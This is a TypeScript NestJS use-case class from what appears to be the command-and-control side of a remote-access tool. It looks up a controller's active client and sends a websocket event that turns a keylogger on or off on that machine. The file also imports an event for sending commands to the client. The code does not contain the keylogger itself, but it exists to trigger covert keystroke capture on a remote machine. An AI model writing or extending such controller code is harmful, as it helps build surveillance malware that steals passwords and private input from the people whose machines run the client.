import { LoggerService } from "@/src/modules/shared/providers";
import { Injectable } from "@nestjs/common";
import { GetCurrentClientUseCase } from "../get-current-client.use-case";
import { WsClientSendCmdCommand } from "@/src/modules/ws-client/application/events/ws-client-send-cmd-command";
import { WsClientSendKeylogger } from "@/src/modules/ws-client/application/events/ws-client-send-keylogger";

@Injectable()
export class SendKeyloggerToClientUseCase {
  constructor(
    private readonly logger: LoggerService,
    private readonly getCurrentClientUseCase: GetCurrentClientUseCase,
    private readonly wsClientSendKeylogger: WsClientSendKeylogger,
  ) {}

  async execute(controllerid: string, status: boolean) {
    const { activeclient } =
      await this.getCurrentClientUseCase.execute(controllerid);

    if (!activeclient) {
      this.logger.error("No active client found");
      return;
    }

    console.log(`Sending keylogger to client: ${activeclient} ${status}`);

    await this.wsClientSendKeylogger.sendKeyloggerEvent(activeclient, status);
  }
}
